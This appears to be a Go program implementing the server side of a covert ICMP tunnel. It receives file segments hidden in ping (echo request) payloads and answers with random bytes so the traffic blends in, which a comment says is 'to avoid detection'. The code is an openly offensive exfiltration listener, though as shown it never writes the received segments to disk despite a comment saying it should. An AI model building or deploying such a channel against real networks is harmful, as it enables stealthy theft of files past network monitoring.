package main

import (
  "fmt"
  "log"
  "math/rand"
  "encoding/json"
  "golang.org/x/net/icmp"
  "golang.org/x/net/ipv4"
)

type FileSegment struct {
  Filename string `json:"filename"`
  SegmentID int `json:"segmentID"`
  //Segments to anticipate, store this an array and compile to a file when done
  TotalSegments int `json:"totalSegments"`
  Data []byte `json:"data"`
}

func main() {
  conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
  if err != nil {
    log.Fatal(fmt.Sprintf("[-]  Error starting server: %q",err))
  }
  defer conn.Close()
  fmt.Println("[+]  ICMP server listening...")
  for {
    buf := make([]byte, 1500)
    n, addr, _ := conn.ReadFrom(buf)
    var msg *icmp.Message
    msg, _ = icmp.ParseMessage(1, buf[:n])
    if msg.Type == ipv4.ICMPTypeEcho {
      receivedData := msg.Body.(*icmp.Echo).Data
      var segment FileSegment
      json.Unmarshal(receivedData, &segment)
      //respond with random data of similar size to avoid detection
      responseData := make([]byte, len(segment.Data))
      rand.Read(responseData)
      segment.Data = responseData
      encodedResponse, _ := json.Marshal(segment)
      reply := icmp.Message{
        Type: ipv4.ICMPTypeEchoReply,
        Code: 0,
        Body: &icmp.Echo{
          ID: msg.Body.(*icmp.Echo).ID, Seq: msg.Body.(*icmp.Echo).Seq,
          Data: encodedResponse,
        },
      }
      out, _ := reply.Marshal(nil)
      conn.WriteTo(out, addr)
    }
  }
}
